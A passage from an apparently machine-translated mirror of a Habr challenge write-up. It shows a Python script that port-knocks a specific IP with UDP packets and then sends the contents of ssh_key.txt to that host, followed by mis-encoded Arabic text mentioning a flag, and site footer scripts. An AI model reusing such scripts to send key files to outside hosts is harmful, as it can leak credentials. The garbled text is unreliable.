class="hljs-keyword">import</span></span> select d = [<span class="hljs-string"><span class="hljs-string">'\x1b\xd1\x8bP\x00\x00\x00\x00'</span></span>, <span class="hljs-string"><span class="hljs-string">'\x16\xbc\xf9 \x00\x00\x00\x00'</span></span>, <span class="hljs-string"><span class="hljs-string">'"\xa5I\x90\x00\x00\x00\x00\x00\x00'</span></span>] s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP) <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> <span class="hljs-string"><span class="hljs-string">"Send 1"</span></span> s.sendto(d[<span class="hljs-number"><span class="hljs-number">0</span></span>], (<span class="hljs-string"><span class="hljs-string">"95.216.185.52"</span></span>, <span class="hljs-number"><span class="hljs-number">5432</span></span>)) time.sleep(<span class="hljs-number"><span class="hljs-number">0.2</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> <span class="hljs-string"><span class="hljs-string">"Send 2"</span></span> s.sendto(d[<span class="hljs-number"><span class="hljs-number">1</span></span>], (<span class="hljs-string"><span class="hljs-string">"95.216.185.52"</span></span>, <span class="hljs-number"><span class="hljs-number">5432</span></span>)) time.sleep(<span class="hljs-number"><span class="hljs-number">0.2</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> <span class="hljs-string"><span class="hljs-string">"Send 3"</span></span> s.sendto(d[<span class="hljs-number"><span class="hljs-number">2</span></span>], (<span class="hljs-string"><span class="hljs-string">"95.216.185.52"</span></span>, <span class="hljs-number"><span class="hljs-number">5432</span></span>)) time.sleep(<span class="hljs-number"><span class="hljs-number">0.2</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> <span class="hljs-string"><span class="hljs-string">"Send 4"</span></span> s.sendto(<span class="hljs-string"><span class="hljs-string">"\x00"</span></span>, (<span class="hljs-string"><span class="hljs-string">"95.216.185.52"</span></span>, <span class="hljs-number"><span class="hljs-number">41357</span></span>)) time.sleep(<span class="hljs-number"><span class="hljs-number">0.2</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> <span class="hljs-string"><span class="hljs-string">"Send 5"</span></span> s.sendto(<span class="hljs-string"><span class="hljs-string">"\x04"</span></span>, (<span class="hljs-string"><span class="hljs-string">"95.216.185.52"</span></span>, <span class="hljs-number"><span class="hljs-number">42381</span></span>)) <span class="hljs-comment"><span class="hljs-comment"># for i in range(256): time.sleep(0.2) print "Send 6" s.sendto("\x02", ("95.216.185.52", 28709)) # Read key with open("ssh_key.txt", "rb") as fr: data = fr.read() print len(data) print "Send 7" s.sendto(data, ("95.216.185.52", 28709)) print s.recvfrom(1500) s.close()</span></span></code> </pre> <br></div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ุฎุท ุงูุจุญุซ: </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ุฅุดุงุฑุฉ {a1ec3c43cae4250faa302c412c7cc524}</font></font></b> <br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ุฅุฐุง ูุฌุญุช ุ ูุณุชุญุตู ุนูู "ููุงูู" ูู ุงูุฑุฏ. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ูู ุงููุงูุน ุ ููุง ูุชุจุช ุ ุงุชุถุญ ุฃูู ููุณ ูู ุงูุถุฑูุฑู ุฅุฑุณุงู ุงููุจูุบ MD5 ุงูุฃูู ูุงูุซุงูู. </font><font style="vertical-align: inherit;">ุฃุนุชูุฏ ุฃูุถูุง ุฃูู ูู ูุชู ุชุญุฏูุฏ ูู ุดูุก ููููุง ููุง ูู ูุทููุจ ุ ููุฏ ุชู ุงุฎุชูุงุฑู ููุชู. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ูู ุฃูู ุฃุนุชูุฏ ุฃููู ุณุฃุชููู ุฏุนูุฉ ุ ูุญูุงูู 40 ุณุงุนุฉ ูุฑุช ูู ุจุฏุงูุฉ ุงููููุฉ ุญุชู ุงููุญุธุฉ ุงูุชู ุฃุฑุณูุช ูููุง ุงูุนูู.</font></font> ุดูุฑุง ูู </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/ar440312/">https://habr.com/ru/post/ar440312/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../ar440302/index.html">CRM - ุชูููุฉ ุงููุฌุงุญ ุ ุชูููุฉ ุงูุฎุทุฃ ุ ุชูููุฉ ุงูููููุฉ</a></li>
<li><a href="../ar440304/index.html">ุงูููุงุทุนุงุช ูู ุงูุฃุฌูุฒุฉ ุงูุฎุงุฑุฌูุฉ ูู ูุธุงู x86. ุงูุฌุฒุก 3. ุชูููู ุชูุฌูู ุงูููุงุทุนุฉ ูู ุดุฑุงุฆุญ ุจุงุณุชุฎุฏุงู ุงููุซุงู ุงูุฃุณุงุณูุฉ</a></li>
<li><a href="../ar440306/index.html">ุชุญุฌูู ูุงุนุฏุฉ ุงูุจูุงูุงุช ูู ุงูุฃูุธูุฉ ุงููุญููุฉ ููุบุงูุฉ</a></li>
<li><a href="../ar440308/index.html">ูุฑู ุชุณุฏ ุ ุฃู ุชูุชุจ ุจุจุทุก - ุงูุฑุฃ ุจุณุฑุนุฉ</a></li>
<li><a href="../ar440310/index.html">ููููุฉ ุชุนููู ุงูุขูุฉ ูููู ุงูููุงุชูุฑ ูุงุณุชุฎุฑุงุฌ ุงูุจูุงูุงุช ูููุง</a></li>
<li><a href="../ar440314/index.html">JDK 12 Release Candidate: Shenandoahุ G1ุ JMHุ Arm64. ุงูุจู ูู ุณูููุบ ุถุฑุจ ุงูุธูุฑ</a></li>
<li><a href="../ar440316/index.html">ุชูุฒูุน ููุญุฏ ููููุงุท ูู ูุซูุซ</a></li>
<li><a href="../ar440318/index.html">ุฅุฌูุงูู ุงููุงุชุฌ ุงููุญูู: ููููุฉ ุงูุชุนุงูู ูุน ุงูุจูุงูุงุช ุงูุดุฎุตูุฉ ูููุธููู ูุงูููุธููู ุงููุณุชูููู ูุงูููุธููู ุงููุธุฑุงุก ุงูุฃูุฑูุจููู</a></li>
<li><a href="../ar440320/index.html">ููุญู ูู ุงูุนุฏุงุฏ DMRSE ูุงูุฏูุณ ุณุฌูุช</a></li>
<li><a href="../ar440322/index.html">ููุงุฐุง ุชุตุจุญ ูุญุฑูุงุช ุงูุฃูุฑุงุต ุงูุตูุจุฉ ุฃูู ุนุฑุถุฉ ูููุดู</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>